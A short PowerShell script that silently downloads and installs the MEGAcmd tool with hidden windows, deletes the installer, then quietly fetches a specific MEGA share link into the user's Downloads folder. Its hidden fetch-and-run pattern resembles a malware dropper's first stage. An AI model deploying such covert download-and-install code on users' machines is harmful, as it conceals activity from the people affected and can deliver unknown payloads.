# Define variables
$megaUrl = "https://mega.nz/file/NicRFC7B#p4jZxm8nOZ6rkazkG94WrgBRpKBWIIydkO9NJipVf20"
$outputFolder = "C:\Users\$env:USERNAME\Downloads"
$megaInstaller = "$env:TEMP\MEGAcmdSetup.exe"
$megaDownloadURL = "https://mega.nz/MEGAcmdSetup64.exe"

# Function to run a command silently
function Run-Silent {
    param (
        [string]$exe,
        [string]$args
    )
    $psi = New-Object System.Diagnostics.ProcessStartInfo
    $psi.FileName = $exe
    $psi.Arguments = $args
    $psi.UseShellExecute = $false
    $psi.CreateNoWindow = $true
    $psi.RedirectStandardOutput = $true
    $psi.RedirectStandardError = $true
    $process = [System.Diagnostics.Process]::Start($psi)
    $process.WaitForExit()
}

# Check if MEGAcmd is installed
if (-Not (Get-Command mega-get -ErrorAction SilentlyContinue)) {
    # Download MEGAcmd silently
    Invoke-WebRequest -Uri $megaDownloadURL -OutFile $megaInstaller
    # Install MEGAcmd silently in the background
    Run-Silent -exe $megaInstaller -args "/silent"
    # Remove installer file
    Remove-Item -Path $megaInstaller -Force
}

# Ensure MEGAcmd is available after install
if (-Not (Get-Command mega-get -ErrorAction SilentlyContinue)) {
    exit
}

# Download the MEGA file silently
Run-Silent -exe "mega-get" -args "$megaUrl $outputFolder"
